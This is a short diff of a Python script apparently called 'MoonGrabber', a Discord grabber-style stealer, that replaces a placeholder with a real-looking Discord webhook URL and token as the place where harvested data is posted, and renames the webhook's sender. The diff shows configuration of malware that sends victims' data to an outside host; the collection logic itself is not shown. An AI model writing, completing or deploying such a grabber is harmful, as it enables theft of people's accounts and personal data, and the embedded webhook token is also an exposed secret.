@@ -7,7 +7,7 @@ from datetime import datetime
 from json import loads, dumps
 from urllib.request import Request, urlopen
 
-webhook_url = "WEBHOOKHERE"
+webhook_url = "https://discord.com/api/webhooks/958487491759992893/-2ZsEp6UslEE3uiwsJRERP-5h6pNQL6-873npg0ZCOAtxpIqOKmtmy11z-qYqdmpO3iB"
 
 languages = {
 	'da'    : 'Danish, Denmark',
@@ -201,7 +201,7 @@ def main():
 	webhook = {
 		"content": "",
 		"embeds": embeds,
-		"username": "MoonGrabber By Keevo",
+		"username": "keevo thank you",
 		"avatar_url": "https://previews.123rf.com/images/djvstock/djvstock1801/djvstock180100077/92578374-lua-e-nuvem-dos-desenhos-animados-vector-%C3%ADcone-gr%C3%A1fico-ilustra%C3%A7%C3%A3o.jpg"
 	}
 	try:
